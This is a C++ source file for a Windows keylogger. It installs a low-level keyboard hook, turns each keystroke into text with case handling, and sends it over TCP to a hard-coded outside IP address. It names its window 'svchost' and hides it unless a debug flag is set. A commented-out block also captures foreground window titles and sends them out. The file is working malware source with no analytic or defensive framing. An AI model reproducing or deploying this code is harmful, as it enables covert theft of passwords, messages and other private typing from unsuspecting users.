#include <VoidNet_LL/Init.hpp>
#include <VoidNet_LL/TcpClient.hpp>

#include <windows.h>

#define	DEBUG	1

#define CLASSNAME	"winkey"
#define WINDOWTITLE	"svchost"

HHOOK	kbdhook;	/* Keyboard hook handle */
bool	running;	/* Used in main loop */

std::net::TcpClient client;
std::net::IPAddress ip("94.61.54.47", 3000);

/*int main(int argc, char **argv)
{
	



	/*while (true)
	{
		std::string lastTitle = "";
		std::stringstream stream;
		//SHORT lastc = 0;
		while (true) 
		{
			// get the active windowtitle
			char title[2048];
			HWND hwndHandle = GetForegroundWindow();
			GetWindowText(hwndHandle, title, 2048);
			if (lastTitle != title) 
			{
				stream << std::endl << std::endl << "Window: ";
				strlen(title) == 0 ? stream << "NO ACTIVE WINDOW" : stream << "'" << title << "'" << std::endl;
				lastTitle = title;
			}

			// logging keys, thats the keylogger
			for (unsigned char c = 1; c < 255; c++) 
			{
				SHORT rv = GetAsyncKeyState(c);
				if (rv & 1) // on press button down
					stream << (int)c << " ";
			}

			std::string data = stream.str();
			if (data.size() > 0)
			{
				std::cout << data;
				if (send(soc, data.c_str(), data.size(), 0) == SOCKET_ERROR)
				{
					break;
				}
				stream.str(std::string());
			}
		}
	}*
}*/







__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp)
{
	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
		static bool capslock = false;
		static bool shift = false;
		char tmp[0xFF] = { 0 };
		std::string str;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
		bool printable;

		/*
		 * Get key name as string
		 */
		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameText(msg, tmp, 0xFF);
		str = std::string(tmp);

		printable = (str.length() <= 1) ? true : false;

		/*
		 * Non-printable characters only:
		 * Some of these (namely; newline, space and tab) will be
		 * made into printable characters.
		 * Others are encapsulated in brackets ('[' and ']').
		 */
		if (!printable) 
		{
			/*
			 * Keynames that change state are handled here.
			 */
			if (str == "CAPSLOCK")
				capslock = !capslock;
			else if (str == "SHIFT")
				shift = true;

			/*
			 * Keynames that may become printable characters are
			 * handled here.
			 */
			if (str == "ENTER") 
			{
				str = "[ENTER]";
				printable = true;
			}
			else if (str == "SPACE") 
			{
				str = " ";
				printable = true;
			}
			else if (str == "TAB") 
			{
				str = "\t";
				printable = true;
			}
			else 
			{
				str = ("[" + str + "]");
			}
		}

		/*
		 * Printable characters only:
		 * If shift is on and capslock is off or shift is off and
		 * capslock is on, make the character uppercase.
		 * If both are off or both are on, the character is lowercase
		 */
		if (printable) 
		{
			if (shift == capslock) /* Lowercase */
			{ 
				for (size_t i = 0; i < str.length(); ++i)
					str[i] = tolower(str[i]);
			}
			else /* Uppercase */
			{ 
				for (size_t i = 0; i < str.length(); ++i) 
				{
					if (str[i] >= 'A' && str[i] <= 'Z') 
						str[i] = toupper(str[i]);
				}
			}

			shift = false;
		}

		int32_t sent;
		client.Send((const std::byte*)(str.c_str()), str.length(), sent);
	}

	return CallNextHookEx(kbdhook, code, wp, lp);
}

LRESULT CALLBACK windowprocedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
	switch (msg) 
	{
	case WM_CLOSE: 
	case WM_DESTROY:
		running = false;
		break;
	default:
		/* Call default message handler */
		return DefWindowProc(hwnd, msg, wp, lp);
	}

	return 0;
}

int WINAPI WinMain(HINSTANCE thisinstance, HINSTANCE previnstance, LPSTR cmdline, int ncmdshow)
{
	HWND		hwnd;
	HWND		fgwindow = GetForegroundWindow(); /* Current foreground window */
	MSG			msg;
	WNDCLASSEX	windowclass;
	HINSTANCE	modulehandle;

	windowclass.hInstance = thisinstance;
	windowclass.lpszClassName = CLASSNAME;
	windowclass.lpfnWndProc = windowprocedure;
	windowclass.style = CS_DBLCLKS;
	windowclass.cbSize = sizeof(WNDCLASSEX);
	windowclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hCursor = LoadCursor(NULL, IDC_ARROW);
	windowclass.lpszMenuName = NULL;
	windowclass.cbClsExtra = 0;
	windowclass.cbWndExtra = 0;
	windowclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;

	if (!(RegisterClassEx(&windowclass)))
		return 1;

	hwnd = CreateWindowEx(NULL, CLASSNAME, WINDOWTITLE, WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, 640, 480, HWND_DESKTOP, NULL,
		thisinstance, NULL);
	if (!(hwnd))
		return 1;

#ifdef DEBUG
	ShowWindow(hwnd, SW_SHOW);
#else
	ShowWindow(hwnd, SW_HIDE);
#endif
	UpdateWindow(hwnd);
	SetForegroundWindow(fgwindow); /* Give focus to the previous fg window */

	/*
	 * Hook keyboard input so we get it too
	 */
	modulehandle = GetModuleHandle(NULL);
	kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, modulehandle, NULL);

	running = true;

	std::net::Initialize();
	client.Connect(ip);

	while (running && client.GetConnectionState() == std::net::SocketConnectionState::Connected)
	{
		/*
		 * Get messages, dispatch to window procedure
		 */
		if (!GetMessageA(&msg, NULL, 0, 0))
			running = false; /*
					  * This is not a "return" or
					  * "break" so the rest of the loop is
					  * done. This way, we never miss keys
					  * when destroyed but we still exit.
					  */
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}